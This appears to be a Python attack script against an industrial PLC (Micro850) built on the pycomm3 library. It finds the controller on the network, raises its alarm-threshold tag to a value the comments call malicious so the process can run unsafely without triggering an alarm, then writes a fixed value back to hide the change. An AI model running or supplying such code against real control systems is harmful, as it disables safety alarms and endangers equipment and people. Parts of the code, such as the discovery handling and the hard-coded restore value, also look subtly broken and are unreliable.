import pycomm3
import time
import socket
import struct

# Configuration
PLC_NAME = "PLC-Micro850"  # Replace with the actual name configured in Connected Components Workbench
ALARM_TAG_NAME = "Alarm_Threshold"  # Replace with the actual tag name for the alarm threshold
ALARM_VALUE_TAG_NAME = "Process_Value" # Replace with the actual tag name for process value
NEW_ALARM_THRESHOLD = 1000  # Replace with the new, potentially malicious alarm threshold
SLEEP_TIME = 5  # Time to sleep after setting the new threshold
RESTORE_THRESHOLD = 100 # Threshold to restore to original value after script executes

def find_plc_ip(plc_name):
    """
    Finds the IP address of the PLC based on its name using Ethernet/IP discovery.
    Requires the pycomm3 library.
    """
    try:
        with pycomm3.CIPDriver() as driver:
            devices = driver.discover()
            for device in devices:
                if device.name == plc_name:
                    print(f"Found PLC {plc_name} at IP address: {device.ip_address}")
                    return device.ip_address
            print(f"PLC with name '{plc_name}' not found on the network.")
            return None
    except Exception as e:
        print(f"Error during PLC discovery: {e}")
        return None

def modify_alarm_threshold(plc_ip, alarm_tag, new_threshold):
    """
    Modifies the alarm threshold on the PLC.

    Args:
        plc_ip (str): The IP address of the PLC.
        alarm_tag (str): The name of the tag holding the alarm threshold value.
        new_threshold (int): The new alarm threshold value to set.
    """
    try:
        with pycomm3.LogixDriver(plc_ip) as plc:
            # Read the current threshold before modifying
            current_threshold = plc.read(alarm_tag).value
            print(f"Current alarm threshold: {current_threshold}")

            # Write the new threshold
            plc.write(alarm_tag, new_threshold)
            print(f"Successfully modified alarm threshold to: {new_threshold}")

            # Verify the change
            read_back_threshold = plc.read(alarm_tag).value
            print(f"Threshold read back from PLC: {read_back_threshold}")

            if read_back_threshold == new_threshold:
                print("Alarm threshold successfully updated.")
            else:
                print("Error: Alarm threshold not updated correctly.")
    except Exception as e:
        print(f"Error communicating with PLC or modifying tag: {e}")
        return False

def read_process_value(plc_ip, process_value_tag):
    """
    Reads the process value from the PLC.

    Args:
        plc_ip (str): The IP address of the PLC.
        process_value_tag (str): The name of the tag holding the process value.

    Returns:
        float: The process value, or None if there was an error.
    """
    try:
        with pycomm3.LogixDriver(plc_ip) as plc:
            response = plc.read(process_value_tag)
            if response.status == 'Success':
                return response.value
            else:
                print(f"Error reading process value: {response.status}")
                return None
    except Exception as e:
        print(f"Error communicating with PLC: {e}")
        return None

def restore_alarm_threshold(plc_ip, alarm_tag, original_threshold):
    """
    Restores the alarm threshold on the PLC to its original value.

    Args:
        plc_ip (str): The IP address of the PLC.
        alarm_tag (str): The name of the tag holding the alarm threshold value.
        original_threshold (int): The original alarm threshold value to restore.
    """
    try:
        with pycomm3.LogixDriver(plc_ip) as plc:
            # Write the original threshold
            plc.write(alarm_tag, original_threshold)
            print(f"Successfully restored alarm threshold to: {original_threshold}")

            # Verify the change
            read_back_threshold = plc.read(alarm_tag).value
            print(f"Threshold read back from PLC: {read_back_threshold}")

            if read_back_threshold == original_threshold:
                print("Alarm threshold successfully restored.")
            else:
                print("Error: Alarm threshold not restored correctly.")
    except Exception as e:
        print(f"Error communicating with PLC or modifying tag: {e}")
        return False


if __name__ == "__main__":
    # 1. Find the PLC's IP address.
    plc_ip = find_plc_ip(PLC_NAME)

    if plc_ip is None:
        print("Could not determine PLC IP address.  Exiting.")
        exit(1)

    # 2. Get the process value initially
    initial_process_value = read_process_value(plc_ip, ALARM_VALUE_TAG_NAME)
    if initial_process_value is not None:
        print(f"Initial process value: {initial_process_value}")
    else:
        print("Could not read initial process value. Continuing...")

    # 3. Modify the alarm threshold.
    modify_alarm_threshold(plc_ip, ALARM_TAG_NAME, NEW_ALARM_THRESHOLD)

    # 4. Simulate the system running, giving the adversary time to act (e.g., manipulate the process).
    print(f"Sleeping for {SLEEP_TIME} seconds to simulate system running...")
    time.sleep(SLEEP_TIME)

    # 5. Read the process value again to see if it exceeds the original threshold (but not the new threshold).
    final_process_value = read_process_value(plc_ip, ALARM_VALUE_TAG_NAME)
    if final_process_value is not None:
        print(f"Final process value: {final_process_value}")
        # Restore the alarm to its original threshold to prevent the alarm to occur.
        restore_alarm_threshold(plc_ip, ALARM_TAG_NAME, RESTORE_THRESHOLD)
        if initial_process_value is not None and final_process_value > RESTORE_THRESHOLD:
            print("CRITICAL: Process value exceeded the original threshold, but no alarm was triggered!")
            print("The alarm modification allowed the process to operate in an unsafe condition.")
        else:
            print("Process value did not exceed the original threshold or alarm was triggered.")
    else:
        print("Could not read final process value.")